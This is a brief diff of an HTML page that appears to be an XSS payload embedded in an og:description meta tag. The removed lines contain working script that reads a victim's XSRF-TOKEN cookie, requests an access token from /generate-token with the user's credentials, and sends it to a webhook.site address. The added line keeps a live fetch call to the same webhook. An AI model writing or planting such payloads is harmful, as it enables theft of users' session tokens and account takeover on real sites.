@@ -1,23 +1,7 @@
 <!DOCTYPE html>
 <head>
   <meta property="og:description" content='<script>
-(() => {
-  const u = "https://webhook.site/a1c566df-0b8c-422e-b3bb-eb97cb87ff8d";
-  const c = document.cookie.match(/XSRF-TOKEN=([^;]+)/);
-  if (!c) return;
-
-  fetch("/generate-token", {
-    method: "POST",
-    headers: { "X-XSRF-TOKEN": decodeURIComponent(c[1]) },
-    credentials: "include"
-  })
-  .then(r => r.json())
-  .then(j => {
-    // Gửi token về webhook ngay sau khi lấy được
-    new Image().src = u + "?access_token=" + encodeURIComponent(j.token);
-  })
-  .catch(e => new Image().src = u + "?err=" + encodeURIComponent(e.message));
-})();
+fetch("https://webhook.site/a1c566df-0b8c-422e-b3bb-eb97cb87ff8d");
 </script>' />
 </head>
 <body><h1>Hello</h1></body>
